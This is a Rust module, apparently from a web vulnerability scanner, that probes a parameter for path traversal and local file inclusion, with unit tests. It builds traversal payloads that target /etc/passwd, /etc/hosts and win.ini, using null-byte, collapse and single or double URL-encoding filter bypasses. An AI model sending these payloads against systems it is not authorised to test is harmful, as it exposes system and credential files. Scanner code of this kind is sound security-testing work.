//! Path traversal / Local File Inclusion (CWE-22 / CWE-98) detection.
//!
//! Evidence-driven: traversal sequences targeting well-known files are injected,
//! and a hit is confirmed only when the response contains that file's *content
//! signature* (e.g. `root:x:0:0:` from `/etc/passwd`). The signature appears
//! only if the file was actually read, so reflection of the payload alone cannot
//! produce a false positive. Multiple traversal depths and encodings are tried.

use crate::sqli::request::Request;
use anyhow::Result;
use lazy_static::lazy_static;
use regex::Regex;

/// A confirmed path-traversal vector.
#[derive(Debug, Clone)]
pub struct PathTravVector {
    pub payload: String,
    pub file: &'static str,
}

struct Target {
    file: &'static str,
    windows: bool,
    signature: &'static str,
}

const TARGETS: &[Target] = &[
    Target { file: "etc/passwd", windows: false, signature: r"root:[^:]*:0:0:" },
    Target {
        file: "etc/hosts",
        windows: false,
        signature: r"(?i)127\.0\.0\.1\s+localhost",
    },
    Target {
        file: "windows/win.ini",
        windows: true,
        signature: r"(?i)\[(fonts|extensions|mci extensions)\]|for 16-bit app support",
    },
];

lazy_static! {
    static ref SIGS: Vec<Regex> = TARGETS
        .iter()
        .map(|t| Regex::new(t.signature).unwrap())
        .collect();
}

// Two traversal depths suffice: a deep climb (8) covers every shallower depth
// because extra `../` are idempotent once the path reaches the filesystem root,
// while a shallow climb (4) hedges against filters that strip or length-cap long
// sequences. The old [3,5,7,8,10] sweep was ~5x the requests for no extra reach.
const DEPTHS: [usize; 2] = [8, 4];

/// Full traversal payload set for the PRIMARY target across depths + encodings.
/// This is where the filter-bypass breadth lives (plain, collapse, single/double
/// URL-encoding, null-byte truncation).
fn payloads(file: &str, windows: bool) -> Vec<String> {
    let mut out = Vec::new();
    if windows {
        out.push("c:\\windows\\win.ini".to_string());
        out.push("c:/windows/win.ini".to_string());
        let bs = file.replace('/', "\\");
        for depth in DEPTHS {
            out.push(format!("{}{bs}", "..\\".repeat(depth))); // plain
            out.push(format!("{}{bs}", "....\\\\".repeat(depth))); // collapse bypass
            out.push(format!("{}{}", "..%5c".repeat(depth), file.replace('/', "%5c"))); // url-enc
        }
    } else {
        out.push(format!("/{file}")); // absolute (raw-path use)
        for depth in DEPTHS {
            let up = "../".repeat(depth);
            out.push(format!("{up}{file}")); // ../../../etc/passwd
            out.push(format!("{up}{file}\u{0}")); // null-byte truncation
            out.push(format!("{}{file}", "....//".repeat(depth))); // ....// collapse bypass
            out.push(format!("{}{}", "..%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc slash
            out.push(format!("{}{}", "%2e%2e%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc dots
            out.push(format!("{}{}", "..%252f".repeat(depth), file.replace('/', "%252f"))); // double-enc
        }
    }
    out
}

/// Compact payload set for FALLBACK targets. Once the primary target has probed
/// every encoding against this parameter, a fallback file faces the same filter —
/// so only the filename changes. We try just absolute + a deep plain/encoded
/// climb to confirm the alternate file, not re-run the whole bypass matrix.
fn payloads_fallback(file: &str, windows: bool) -> Vec<String> {
    if windows {
        vec![
            "c:\\windows\\win.ini".to_string(),
            format!("{}{}", "..\\".repeat(8), file.replace('/', "\\")),
            format!("{}{}", "..%5c".repeat(8), file.replace('/', "%5c")),
        ]
    } else {
        vec![
            format!("/{file}"),
            format!("{}{file}", "../".repeat(8)),
            format!("{}{}", "..%2f".repeat(8), file.replace('/', "%2f")),
        ]
    }
}

/// Check a parameter for path traversal / LFI.
pub async fn check_path_traversal(request: &Request<'_>) -> Result<Option<PathTravVector>> {
    for (i, target) in TARGETS.iter().enumerate() {
        let sig = &SIGS[i];
        // First target carries the full encoding-bypass matrix; later targets
        // (existence fallbacks under the same filter) use the compact set.
        let payloads = if i == 0 {
            payloads(target.file, target.windows)
        } else {
            payloads_fallback(target.file, target.windows)
        };
        for payload in payloads {
            let page = request.query_page(&payload).await?;
            if sig.is_match(&page) {
                return Ok(Some(PathTravVector {
                    payload,
                    file: target.file,
                }));
            }
        }
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn signatures_match_real_file_content() {
        assert!(SIGS[0].is_match("root:x:0:0:root:/root:/bin/bash"));
        assert!(SIGS[1].is_match("127.0.0.1   localhost"));
        assert!(SIGS[2].is_match("; for 16-bit app support\n[fonts]"));
    }

    #[test]
    fn signatures_do_not_match_a_reflected_payload() {
        // A reflected traversal payload (no file read) must not match.
        for sig in SIGS.iter() {
            assert!(!sig.is_match("you requested ../../../../etc/passwd (not found)"));
        }
    }

    #[test]
    fn payloads_cover_encodings_and_depths() {
        let p = payloads("etc/passwd", false);
        assert!(p.iter().any(|x| x.contains("../../../etc/passwd")));
        assert!(p.iter().any(|x| x.contains("%2e%2e%2f")));
        assert!(p.iter().any(|x| x.contains("..%252f")));
        assert!(p.iter().any(|x| x == "/etc/passwd"));
    }
}
